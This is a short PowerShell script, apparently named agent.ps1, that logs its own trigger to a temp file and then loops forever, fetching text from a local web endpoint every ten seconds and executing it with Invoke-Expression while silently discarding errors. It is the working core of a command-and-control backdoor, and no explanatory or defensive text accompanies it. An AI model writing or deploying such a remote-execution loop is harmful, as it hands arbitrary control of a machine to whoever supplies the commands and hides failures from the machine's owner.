Add-Content "$env:TEMP\ps_log.txt" "$(Get-Date) - agent.ps1 triggered"

while ($true) {
    try {
        $cmd = Invoke-RestMethod -Uri "http://localhost:8080/getcommand.txt"
        if ($cmd -ne "") {
            iex $cmd
        }
    } catch {}
    Start-Sleep -Seconds 10
}
